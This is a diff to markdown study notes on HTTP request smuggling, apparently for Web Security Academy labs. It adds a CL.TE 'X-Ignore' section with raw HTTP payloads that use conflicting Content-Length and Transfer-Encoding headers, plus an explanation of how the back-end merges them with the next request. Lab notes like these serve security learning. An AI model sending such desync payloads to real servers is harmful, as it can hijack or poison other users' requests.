@@ -37,6 +37,10 @@ G
 
 If the front-end uses `Content-Length` it will forward the declared number of bytes and include the `G`. The back-end, interpreting the body as chunked, reads the `0\r\n\r\n` sequence (end of chunked body) and then sees `G` as the start of the next request (for example the first byte of the next request line). In other words, `G` becomes the first byte of the next request the back-end processes, which allows an attacker to smuggle bytes into a subsequent request.
 
+![alt text](image.png)
+
+
+
 
 ## TE.CL detection
 
@@ -143,3 +147,44 @@ Explanation (brief)
 
 Verify carefully: byte counts and CRLFs must be exact — off-by-one errors will make the smuggle fail. If you want, I can compute exact byte lengths for the specific smuggled content you plan to use and update the payload accordingly.
 
+## CL.TE X-ignore
+
+To smuggle a request on a CL.TE-vulnerable target, first confirm the vulnerability (see the detection section). Then send a request like this:
+
+```http
+POST / HTTP/1.1\r\n
+Host: 0a5700c50463d097824ad9a200e800ae.web-security-academy.net\r\n
+Content-Length: 36\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+GET /404 HTTP/1.1\r\n
+X-Ignore: xx\r\n
+```
+
+Follow it immediately with a second request:
+
+```http
+GET / HTTP/1.1\r\n
+Host: 0a5700c50463d097824ad9a200e800ae.web-security-academy.net\r\n
+\r\n
+```
+
+What happens
+
+- The front-end (which honors the outer `Content-Length`) forwards the entire outer request to the back-end.
+- The back-end (which parses chunked encoding) stops processing the chunked body after `0\r\n\r\n` and begins parsing the following bytes as a new request.
+- Because the forwarded bytes include `GET /404 ...` plus the start of the following request, the two requests are concatenated. The back-end therefore sees the smuggled request line combined with the following request header, for example:
+
+```http
+GET /404 HTTP/1.1\r\n
+X-Ignore: xxGET / HTTP/1.1\r\n
+Host: 0a5700c50463d097824ad9a200e800ae.web-security-academy.net\r\n
+```
+
+Notes
+
+- Preserve exact CRLF sequences and byte counts when testing; framing issues depend on precise bytes.
+- This technique relies on how the front-end and back-end disagree about framing; behavior may vary between servers.
+
+![alt text](image-1.png)
